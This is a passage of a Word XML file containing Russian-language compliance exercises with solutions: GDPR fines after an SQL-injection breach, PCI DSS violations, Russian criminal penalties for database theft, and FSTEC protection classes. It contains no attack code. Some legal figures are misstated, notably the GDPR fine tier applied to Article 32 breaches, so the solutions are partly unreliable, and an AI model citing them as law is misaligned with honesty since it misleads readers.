        <w:t xml:space="preserve"> (ежегодный аудит QSA, стоимость $50,000-100,000). Проще использовать шлюз.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 2: Штраф по GDPR</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компания </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HealthApp</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (США) разработала приложение для фитнеса. Собирает данные о здоровье пользователей (пульс, давление, вес). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5 млн пользователей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> из ЕС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2024 году утечка</w:t>
      </w:r>
      <w:r>
        <w:t>: хакеры украли базу данных (5 млн записей), включая email, пароли (хешированные bcrypt), данные о здоровье.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Причина утечки</w:t>
      </w:r>
      <w:r>
        <w:t>: SQL-инъекция (не использовали prepared statements).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Компания уведомила</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> регулятора через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10 дней</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (вместо 72 часов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Годовой оборот</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> компании: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$200 млн</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какие нарушения GDPR?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какой максимальный штраф (формула)?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какой реальный штраф (оценка)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нарушения GDPR**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нарушение безопасности** (SQL-инъекция → утечка) — ст. 32 GDPR (Security of processing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка уведомления** (10 дней вместо 72 часов) — ст. 33 GDPR (Data breach notification)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Данные о здоровье** — special category (ст. 9 GDPR), требуют **усиленной защиты**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Максимальный штраф**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>За утечку (ст. 32) → **€20 млн** или **4% годового оборота**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>За задержку (ст. 33) → **€10 млн** или **2% годового оборота**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Считаем 4% от оборота</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   $200 млн × 4% = $8 млн ≈ €7.4 млн (курс $1 = €0.92)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Максимальный штраф</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>€20 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (т.к. €20 млн &gt; €7.4 млн, берём бóльшее).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Реальный штраф** (оценка):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Учитывая **серьёзность** (данные о здоровье, 5 млн пользователей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Халатность** (SQL-инъекция = базовая ошибка)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка уведомления** (10 дней)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прецеденты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>British Airways (400k пользователей) → £20 млн</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Marriott (339 млн пользователей) → £18.4 млн</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оценка</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>€10-15 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (примерно $11-16 млн).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>prepared statements</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>уведомляй в течение 72 часов</w:t>
      </w:r>
      <w:r>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 3: PCI DSS Compliance</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Вы — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>системный администратор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> интернет-магазина (Россия). Принимаете платежи по картам через свой сервер (не через шлюз). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100,000 транзакций в год</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Текущая инфраструктура</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Windows Server 2012 (не обновлялся 2 года)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Apache 2.4 (TLS 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Номера карт хранятся в БД **в открытом виде** (plain text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CVV хранится (для "удобства" повторных платежей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логи не ведутся</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какой **уровень PCI DSS** требуется?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какие **критические нарушения** PCI DSS?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какие **меры** нужно предпринять **срочно**?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какой штраф, если утекут карты?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень PCI DSS**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>100,000 транзакций/год → между 20,000 и 1,000,000 → **Level 3**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требования: **SAQ (Self-Assessment Questionnaire)** + квартальное сканирование уязвимостей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Критические нарушения**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ **Хранение CVV** (Requirement 3.2) → **ЗАПРЕЩЕНО**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ **PAN в открытом виде** (Requirement 3.4) → должен быть **зашифрован** (AES-256) или **замаскирован** (только последние 4 цифры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ **TLS 1.0** (Requirement 4.1) → устарел, требуется **TLS 1.2+** (с июня 2018)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ **Windows Server 2012** (Requirement 6.2) → **не поддерживается Microsoft** с 2023 года (нет патчей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ **Нет логов** (Requirement 10) → хранить логи **1 год**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Срочные меры**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**УДАЛИТЬ ВСЕ CVV** (из БД, backup, логов) — **НЕМЕДЛЕННО**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Зашифровать PAN** (AES-256) или использовать **токенизацию**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обновить TLS** (1.2 или 1.3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обновить Windows Server** (2022 или Linux)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Включить логирование** (все доступы к БД с картами)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нанять QSA** (Qualified Security Assessor) для аудита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Лучшее решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Переехать на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>платёжный шлюз</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Stripe, Яндекс.Касса) → они берут на себя PCI DSS (ты просто работаешь с токенами, не видишь карты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Штраф при утечке**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Банк штрафует магазин: **$5,000 - $100,000 в месяц** (пока не исправишь)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Могут **запретить принимать карты** (смерть для бизнеса)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Иски клиентов (если утекли карты и деньги украли)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Репутационный ущерб (никто не будет покупать)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Хранить карты = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ад</w:t>
      </w:r>
      <w:r>
        <w:t>. Используй платёжный шлюз.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 4: Уголовная ответственность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Студент </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вася</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (20 лет, Москва) решил </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>подзаработать</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Нашёл </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQL-инъекцию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в интернет-магазине, скачал базу данных (100,000 записей: email, хеши паролей bcrypt, адреса). Выложил базу на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хакерский форум</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Breach Forums).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Через месяц </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Васю задержали</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>По каким **статьям УК РФ** могут обвинить?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какое **максимальное наказание**?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какие **смягчающие обстоятельства** может привести адвокат?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Что будет, если Вася **несовершеннолетний** (17 лет)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Статьи УК РФ**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ст. 272 (Неправомерный доступ к компьютерной информации)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Часть 2 (группа лиц ИЛИ с причинением крупного ущерба &gt; ₽1 млн): до **5 лет** лишения свободы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Часть 3 (группой с тяжкими последствиями): до **7 лет**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оценка ущерба</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компания потеряла клиентов, репутацию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Штраф по 152-ФЗ (₽300,000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Иски клиентов (каждый по ₽5,000 → 100,000 × ₽5,000 = ₽500 млн теоретически)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Если ущерб &gt; ₽1 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Часть 2, до 5 лет</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Максимальное наказание**: **5 лет** лишения свободы + штраф до **₽200,000** (ст. 272, ч. 2).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Смягчающие обстоятельства** (ст. 61 УК РФ):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Первое преступление (раньше не судим)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Явка с повинной (если сам пришёл в полицию)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Молодой возраст (20 лет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Возместил ущерб (договорился с магазином о компенсации)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Возможный приговор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2 года условно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> + штраф </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽50,000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (если адвокат хороший и Вася раскаялся).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Если несовершеннолетний** (17 лет):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Наказание **смягчается** (ст. 88 УК РФ): не более **6 лет** (но для ст. 272 максимум 5 лет, так что без изменений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорее всего условный срок** (если первое преступление)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Возможна отсрочка** (передать под надзор родителей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Не лезь в чужие базы. Если нашёл уязвимость → сообщи компании (bug bounty). Хакеры, которые сидят в тюрьме, — это не круто, это грустно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 5: ФСТЭК — Класс защищённости</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Вы — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CISO</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> банка (Россия). Разрабатываете новую систему </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>дистанционного банковского обслуживания</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ДБО) для клиентов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**10 млн клиентов**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Данные**: ФИО, паспорт, адрес, счета, транзакции, балансы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Угрозы**: внешние хакеры (APT, ransomware), внутренние (инсайдеры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какой **класс защищённости АС** требуется (по ФСТЭК)?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какие **меры защиты** нужны для этого класса?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Нужна ли **сертификация СЗИ** (каких именно)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Класс защищённости**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Тип данных**: Персональные данные (ПДн) + банковская тайна</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Количество субъектов**: 10 млн (очень много)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Угрозы**: внешние + внутренние</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>По Приказу ФСТЭК №17</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Банковская тайна + ПДн → **Класс 1К** (конфиденциальная информация, высокий класс)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
